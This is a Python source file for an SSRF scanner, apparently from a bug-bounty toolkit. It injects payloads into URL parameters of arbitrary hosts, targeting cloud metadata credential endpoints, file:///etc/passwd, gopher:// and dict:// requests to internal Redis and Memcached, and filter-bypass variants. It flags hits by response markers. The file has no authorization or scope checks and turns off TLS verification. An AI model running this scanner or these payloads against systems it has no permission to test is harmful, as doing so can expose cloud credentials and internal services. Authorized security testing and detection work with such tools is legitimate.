"""
SSRF (Server-Side Request Forgery) Scanner

Detects SSRF vulnerabilities:
- URL parameter injection
- Internal network access attempts
- Cloud metadata endpoint access
- Protocol smuggling (file://, gopher://, dict://)

WHY SSRF?
SSRF is a critical vulnerability that allows attackers to:
- Access internal services (databases, admin panels)
- Read cloud metadata (AWS/GCP/Azure credentials)
- Port scan internal networks
- Bypass firewalls and access controls

This is where BIG bounties are - $10k+ for cloud metadata access.
"""
import asyncio
import aiohttp
import re
import json
from pathlib import Path
from urllib.parse import urljoin, urlparse, parse_qs, urlencode, urlunparse
from src.utils import learn, success, error, info, warning, timestamp


class SSRFScanner:
    def __init__(self, config: dict, learn_mode: bool = False):
        self.config = config
        self.learn_mode = learn_mode
        self.timeout = aiohttp.ClientTimeout(total=15)
        
        # Parameters commonly vulnerable to SSRF
        self.ssrf_params = [
            'url', 'uri', 'path', 'dest', 'redirect', 'uri', 'path', 'continue',
            'url', 'window', 'next', 'data', 'reference', 'site', 'html', 'val',
            'validate', 'domain', 'callback', 'return', 'page', 'feed', 'host',
            'port', 'to', 'out', 'view', 'dir', 'show', 'navigation', 'open',
            'file', 'document', 'folder', 'pg', 'php_path', 'style', 'doc',
            'img', 'filename', 'image', 'image_url', 'pic', 'src', 'source',
            'link', 'href', 'api', 'api_url', 'endpoint', 'proxy', 'request',
            'fetch', 'load', 'read', 'target', 'resource', 'content',
        ]
        
        # SSRF payloads - internal/cloud targets
        self.payloads = {
            'localhost': [
                'http://localhost/',
                'http://127.0.0.1/',
                'http://[::1]/',
                'http://0.0.0.0/',
                'http://127.1/',
                'http://127.0.1/',
                'http://2130706433/',  # Decimal IP for 127.0.0.1
                'http://0x7f000001/',  # Hex IP for 127.0.0.1
                'http://localhost:22/',
                'http://localhost:3306/',
                'http://localhost:6379/',
                'http://localhost:27017/',
            ],
            'cloud_metadata': [
                # AWS
                'http://169.254.169.254/latest/meta-data/',
                'http://169.254.169.254/latest/meta-data/iam/security-credentials/',
                'http://169.254.169.254/latest/user-data/',
                # GCP
                'http://metadata.google.internal/computeMetadata/v1/',
                'http://169.254.169.254/computeMetadata/v1/',
                # Azure
                'http://169.254.169.254/metadata/instance?api-version=2021-02-01',
                # DigitalOcean
                'http://169.254.169.254/metadata/v1/',
                # Alibaba
                'http://100.100.100.200/latest/meta-data/',
            ],
            'internal_networks': [
                'http://10.0.0.1/',
                'http://172.16.0.1/',
                'http://192.168.0.1/',
                'http://192.168.1.1/',
                'http://intranet/',
                'http://internal/',
                'http://corp/',
            ],
            'protocol_smuggling': [
                'file:///etc/passwd',
                'file:///c:/windows/win.ini',
                'dict://localhost:11211/stats',
                'gopher://localhost:6379/_INFO',
            ],
            'bypass_techniques': [
                'http://127.0.0.1.nip.io/',
                'http://spoofed.burpcollaborator.net/',
                'http://localhost%00.example.com/',
                'http://localhost%2523@example.com/',
                'http://127.0.0.1#@example.com/',
                'http://127.0.0.1?@example.com/',
            ]
        }
        
        # Indicators of successful SSRF
        self.success_indicators = {
            'localhost': ['root:', 'localhost', '127.0.0.1', 'Connection refused'],
            'cloud_metadata': [
                'ami-id', 'instance-id', 'security-credentials',
                'computeMetadata', 'instance/zone', 'access_token',
                'subscriptionId', 'resourceGroupName',
            ],
            'internal': ['intranet', 'internal', 'admin', 'dashboard'],
            'file_read': ['root:x:', '[extensions]', 'for 16-bit app support'],
        }
    
    async def test_ssrf(self, session: aiohttp.ClientSession, url: str, 
                        param: str, payload: str, category: str) -> dict | None:
        """Test a single SSRF payload."""
        try:
            parsed = urlparse(url)
            query_params = parse_qs(parsed.query)
            
            # Inject payload
            query_params[param] = [payload]
            new_query = urlencode(query_params, doseq=True)
            test_url = urlunparse((
                parsed.scheme, parsed.netloc, parsed.path,
                parsed.params, new_query, parsed.fragment
            ))
            
            headers = {
                'User-Agent': 'Mozilla/5.0 (compatible; SSRFScanner/1.0)',
            }
            
            async with session.get(
                test_url, headers=headers, timeout=self.timeout,
                ssl=False, allow_redirects=False
            ) as resp:
                content = await resp.text()
                
                # Check for success indicators
                indicators = self.success_indicators.get(category, [])
                for indicator in indicators:
                    if indicator.lower() in content.lower():
                        return {
                            'url': url,
                            'test_url': test_url,
                            'param': param,
                            'payload': payload,
                            'category': category,
                            'indicator': indicator,
                            'status': resp.status,
                            'evidence': content[:500],
                            'severity': self.get_severity(category)
                        }
                
                # Check for timing-based detection (slow response might indicate internal access)
                # Check for different response than baseline
                
        except asyncio.TimeoutError:
            # Timeout might indicate internal network access attempt
            return {
                'url': url,
                'test_url': f"{url}?{param}={payload}",
                'param': param,
                'payload': payload,
                'category': category,
                'indicator': 'timeout',
                'status': 'timeout',
                'evidence': 'Request timed out - possible internal access',
                'severity': 'medium'
            }
        except Exception:
            pass
        return None
    
    def get_severity(self, category: str) -> str:
        """Get severity based on SSRF category."""
        severity_map = {
            'cloud_metadata': 'critical',
            'file_read': 'critical',
            'localhost': 'high',
            'internal_networks': 'high',
            'protocol_smuggling': 'high',
            'bypass_techniques': 'medium',
        }
        return severity_map.get(category, 'medium')
    
    async def find_ssrf_params(self, session: aiohttp.ClientSession, url: str) -> list:
        """Find URL parameters that might be vulnerable to SSRF."""
        found_params = []
        parsed = urlparse(url)
        query_params = parse_qs(parsed.query)
        
        # Check existing params
        for param in query_params:
            if param.lower() in self.ssrf_params:
                found_params.append(param)
        
        # Also test common SSRF params even if not in URL
        for param in self.ssrf_params[:15]:  # Top 15 most common
            if param not in query_params:
                found_params.append(param)
        
        return found_params
    
    async def scan_host(self, session: aiohttp.ClientSession, host: str) -> dict:
        """Scan a host for SSRF vulnerabilities."""
        result = {
            'host': host,
            'vulnerable': [],
            'potential': [],
            'tested_params': [],
            'tested_payloads': 0
        }
        
        base_url = f"https://{host}" if not host.startswith('http') else host
        
        # Find parameters to test
        params_to_test = await self.find_ssrf_params(session, base_url)
        result['tested_params'] = params_to_test
        
        # Test each parameter with payloads
        for param in params_to_test[:10]:  # Limit params
            for category, payloads in self.payloads.items():
                for payload in payloads[:5]:  # Limit payloads per category
                    result['tested_payloads'] += 1
                    finding = await self.test_ssrf(session, base_url, param, payload, category)
                    
                    if finding:
                        if finding['severity'] in ['critical', 'high']:
                            result['vulnerable'].append(finding)
                        else:
                            result['potential'].append(finding)
                    
                    await asyncio.sleep(0.1)  # Rate limiting
        
        return result
    
    async def scan_async(self, hosts: list, output_dir: str) -> dict:
        """Scan multiple hosts for SSRF."""
        learn("SSRF Scanning",
              "Server-Side Request Forgery lets attackers make the server request internal resources:\n\n"
              "• Access cloud metadata (AWS/GCP/Azure credentials) - CRITICAL\n"
              "• Read internal files (file:// protocol)\n"
              "• Port scan internal networks\n"
              "• Access internal admin panels\n\n"
              "We test URL parameters with payloads targeting:\n"
              "1. localhost/127.0.0.1 variations\n"
              "2. Cloud metadata endpoints (169.254.169.254)\n"
              "3. Internal network ranges (10.x, 172.x, 192.168.x)\n"
              "4. Protocol smuggling (file://, gopher://, dict://)\n\n"
              "Cloud metadata SSRF = $10,000+ bounties",
              self.learn_mode)
        
        info(f"Scanning {len(hosts)} hosts for SSRF vulnerabilities...")
        
        results = {
            'total_hosts': len(hosts),
            'vulnerable_hosts': 0,
            'critical_findings': [],
            'high_findings': [],
            'potential_findings': [],
            'total_payloads_tested': 0,
            'by_host': {}
        }
        
        connector = aiohttp.TCPConnector(limit=10, ssl=False)
        async with aiohttp.ClientSession(connector=connector) as session:
            semaphore = asyncio.Semaphore(5)
            
            async def scan_with_limit(host):
                async with semaphore:
                    return await self.scan_host(session, host)
            
            tasks = [scan_with_limit(host) for host in hosts]
            host_results = await asyncio.gather(*tasks, return_exceptions=True)
            
            for host_result in host_results:
                if isinstance(host_result, dict):
                    host = host_result['host']
                    results['by_host'][host] = host_result
                    results['total_payloads_tested'] += host_result['tested_payloads']
                    
                    if host_result['vulnerable']:
                        results['vulnerable_hosts'] += 1
                        
                        for finding in host_result['vulnerable']:
                            if finding['severity'] == 'critical':
                                results['critical_findings'].append(finding)
                            else:
                                results['high_findings'].append(finding)
                    
                    results['potential_findings'].extend(host_result['potential'])
        
        # Report findings
        if results['critical_findings']:
            warning(f"🚨 {len(results['critical_findings'])} CRITICAL SSRF vulnerabilities!")
            for f in results['critical_findings']:
                warning(f"  → {f['host']}: {f['category']} via '{f['param']}' param")
        
        if results['high_findings']:
            warning(f"⚠️ {len(results['high_findings'])} HIGH severity SSRF findings")
        
        success(f"Tested {results['total_payloads_tested']} payloads on {len(hosts)} hosts")
        
        # Save results
        output_file = Path(output_dir) / f"ssrf_scan_{timestamp()}.json"
        with open(output_file, 'w') as f:
            json.dump(results, f, indent=2, default=str)
        
        # Save critical findings separately
        if results['critical_findings']:
            critical_file = Path(output_dir) / "ssrf_critical.txt"
            with open(critical_file, 'w') as f:
                f.write("# CRITICAL SSRF FINDINGS\n")
                f.write("# VERIFY MANUALLY BEFORE REPORTING!\n\n")
                for finding in results['critical_findings']:
                    f.write(f"URL: {finding['url']}\n")
                    f.write(f"Test URL: {finding['test_url']}\n")
                    f.write(f"Parameter: {finding['param']}\n")
                    f.write(f"Payload: {finding['payload']}\n")
                    f.write(f"Category: {finding['category']}\n")
                    f.write(f"Evidence: {finding['evidence'][:200]}\n")
                    f.write("-" * 50 + "\n")
        
        return results
    
    def scan(self, hosts: list, output_dir: str) -> dict:
        """Synchronous wrapper."""
        return asyncio.run(self.scan_async(hosts, output_dir))
